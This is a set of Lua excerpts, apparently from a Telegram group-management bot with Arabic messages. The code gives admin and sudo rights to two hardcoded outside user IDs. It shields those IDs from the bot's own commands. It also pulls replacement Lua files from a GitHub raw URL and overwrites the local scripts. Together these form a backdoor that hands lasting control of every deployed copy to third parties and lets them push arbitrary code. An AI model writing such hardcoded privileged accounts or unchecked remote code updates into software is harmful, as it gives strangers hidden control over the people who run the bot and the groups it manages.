...
local Adminn = false
if msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1792413842 or msg.sender_user_id_ == 1420036323 then 
Adminn = true
...
if edit then EditMsg(msg.chat_id_,msg.id_,'10% - |█    @UUOUOU_7     |') end
if edit then EditMsg(msg.chat_id_,msg.id_,'20% - |███  @UUOUOU_7       |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/main/inc/Run.lua','./inc/Run.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'40% - |█████  @UUOUOU_7     |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/main/inc/locks.lua','./inc/locks.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'60% - |███████  @UUOUOU_7   |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/main/inc/Script.lua','./inc/Script.lua')
if edit then EditMsg(msg.chat_id_,msg.id_,'80% - |█████████ @UUOUOU_7  |') end
download_file('https://raw.githubusercontent.com/iamspeedwhourhhhhhh/speed/main/inc/functions.lua','./inc/functions.lua')
...
result = false
if msg.sender_user_id_ == 1792413842 or msg.sender_user_id_ == 1420036323 then 
SudoBase = true
...
if UserID == 1792413842 or UserID == 1420036323 then return sendMsg(ChatID,MsgID,"- لا يمكنك تنفيذ الامر ضد مطور السورس ") end
